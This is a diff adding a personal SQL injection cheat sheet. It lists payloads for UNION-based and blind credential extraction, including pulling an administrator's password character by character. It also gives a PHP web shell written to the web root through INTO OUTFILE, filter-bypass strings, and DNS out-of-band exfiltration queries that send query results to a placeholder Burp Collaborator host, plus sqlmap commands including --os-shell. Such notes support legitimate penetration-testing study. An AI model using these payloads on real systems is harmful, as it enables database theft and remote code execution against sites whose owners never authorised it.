@@ -1,0 +1,235 @@
+finding SQLi
+	'
+	"
+	'OR 1=1--%20 
+	' OR 1=1 order by 3--%20 	
+		try other reorder numbers to find valid values
+	' OR 1=1 and 1=2 UNION SELECT 1,database(),3,4--%20
+		gets name of database in the #2 field
+
+	Fuzzing using Intruder and SecLists
+
+
+UNION attack
+	How many columns are returned by original query?
+		'ORDER BY 1--%20
+		'ORDER BY 2--%20
+		... until ORDER BY results in error
+
+		' UNION SELECT NULL--%20
+		' UNION SELECT NULL,NULL--%20
+		... until extra row of NULL added
+		
+		' UNION SELECT NULL FROM DUAL--%20  	for Oracle DB
+	
+	Which columns returned are of a suitable data type to hold the results?
+		Looking for string type column
+		' UNION SELECT 'a',NULL,NULL--%20
+		' UNION SELECT NULL,'a',NULL--%20
+		' UNION SELECT NULL,NULL,'a'--%20
+	
+	' UNION SELECT username, password FROM users--%20
+
+	Single column results may require concatenation
+		' UNION SELECT NULL, username||password FROM users--%20
+		
+		' UNION SELECT NULL, concat(username,':',password) FROM users--%20
+			for MySQL
+
+		' UNION SELECT username || '~' || password FROM users--%20
+			for Oracle DB
+
+version info
+	' UNION SELECT @@version--%20
+	' UNION SELECT banner FROM v$version--%20
+		for Oracle
+
+list tables
+	' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--%20
+
+	' UNION SELECT table_name FROM all_tables--%20
+		for Oracle
+
+list columns
+	' UNION SELECT column_name FROM information_schema.columns WHERE TABLE_NAME = '<table name>'--%20 
+
+	' UNION SELECT column_name FROM all_tab_columns WHERE table_name= '<table name>'--%20
+		for Oracle
+
+Blind Attacks with different valid and invalid responses
+	'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--%20
+	'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>5--%20
+	'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,1,1)='m'--%20
+
+Blind Attacks with same valid and invalid response
+	Compare responses for conditional database errors:
+	' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--%20
+	' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--%20
+
+	' UNION SELECT CASE WHEN (username = 'administrator' and SUBSTRING(password, 1, 1) = 'a') then 1/0 else null end from users--%20
+
+	Compare responses for conditional time delays:
+	'; IF (1=2) WAITFOR DELAY '0:0:10'--%20
+	'; IF (1=1) WAITFOR DELAY '0:0:10'--%20
+
+	'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' and SUBSTRING(password, 1, 1) = 'a') WAITFOR DELAY '0:0:10'--%20
+
+	Example - getting password for username administrator in users:
+
+    '%3B+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--%20
+
+    '%3B+SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--%20
+
+	'%3B+SELECT+CASE+WHEN+(username='administrator'+and+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--%20
+
+    '%3B+SELECT+CASE+WHEN+(username='administrator'+and+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--%20
+
+Out of Band
+	Burp Collaborator - requires PRO
+	
+
+shell creation
+	' OR 1=1 and 1=2 UNION select 1,"<?php system($_REQUEST['cmd']); ?>",3,4 into outfile "/var/www/html/<site>/cmd.php"#
+
+	' OR 1=1 and 1=2 UNION select 1,"<?php system($_REQUEST['cmd']); ?>",3,4 into outfile "/var/www/html/cmd.php"#
+
+
+
+payload bypass
+	+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+
+
+
+Syntax Notes
+
+String concatenation
+	Oracle		'foo'||'bar'
+	Microsoft	'foo'+'bar'
+	PostgreSQL	'foo'||'bar'
+	MySQL		'foo' 'bar' [Note the space between the two strings]
+				CONCAT('foo','bar')
+
+Substring
+offset index is 1-based
+	Oracle		SUBSTR('foobar', 4, 2)
+	Microsoft	SUBSTRING('foobar', 4, 2)
+	PostgreSQL	SUBSTRING('foobar', 4, 2)
+	MySQL		SUBSTRING('foobar', 4, 2)
+
+Comments
+	Oracle		--comment
+	Microsoft	--comment
+				/*comment*/
+	PostgreSQL	--comment
+				/*comment*/
+	MySQL		#comment
+				-- comment [Note the space after the double dash]
+				/*comment*/
+	--%20 works for all 4
+
+Database version
+	Oracle		SELECT banner FROM v$version
+				SELECT version FROM v$instance
+	Microsoft	SELECT @@version
+	PostgreSQL	SELECT version()
+	MySQL		SELECT @@version
+
+Database contents
+	Oracle		SELECT * FROM all_tables
+				SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+	Microsoft	SELECT * FROM information_schema.tables
+				SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+	PostgreSQL	SELECT * FROM information_schema.tables
+				SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+	MySQL		SELECT * FROM information_schema.tables
+				SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Conditional errors
+	Oracle		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0)
+				ELSE NULL END FROM dual
+	Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL 
+				END
+	PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as 
+				text) ELSE NULL END
+	MySQL		SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM 
+				information_schema.tables),'a')
+
+Batched (or stacked) queries
+	Oracle		Does not support batched queries.
+	Microsoft	QUERY-1-HERE; QUERY-2-HERE
+	PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
+	MySQL		Does not support batched queries.
+
+Time delays
+	Oracle		dbms_pipe.receive_message(('a'),10)
+	Microsoft	WAITFOR DELAY '0:0:10'
+	PostgreSQL	SELECT pg_sleep(10)
+	MySQL		SELECT sleep(10)
+
+Conditional time delays
+	Oracle		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 
+				'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+	Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+	PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) 
+				ELSE pg_sleep(0) END
+	MySQL		SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
+
+DNS lookup
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+
+	Oracle	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+		
+		SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+
+			The following technique works on fully patched Oracle installations, but requires elevated privileges:
+
+		SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
+	
+	Microsoft	exec master..xp_dirtree 
+				'//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
+	
+	PostgreSQL	copy (SELECT '') to program 'nslookup
+				YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
+
+	MySQL	The following techniques work on Windows only:
+
+		LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
+		SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
+
+DNS lookup with data exfiltration
+You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+
+	Oracle		SELECT extractvalue(xmltype('<?xml version="1.0" 
+				encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+	Microsoft	declare @p varchar(1024);set @p=(SELECT 
+				YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
+	PostgreSQL	create OR replace function f() returns void as $$
+				declare c text;
+				declare p text;
+				begin
+				SELECT into p (SELECT YOUR-QUERY-HERE);
+				c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
+				execute c;
+				END;
+				$$ language plpgsql security definer;
+				SELECT f();
+	MySQL		The following technique works on Windows only:
+				SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
+
+
+sqlmap
+	GET
+		sqlmap -u "https://<target URL>"
+	POST
+		sqlmap -r <file containing POST request> -p searchTerm 
+	Options
+		--dbs 		
+		--tables 	
+		--dump -D <database> -T <table>
+		--reg-read 
+			failure confirms we are on Linux machine
+		--sql-query="SELECT * FROM <database.table>"
+		--sql-shell
+			SQL shell to run queries directly
+		--os-shell
+
+
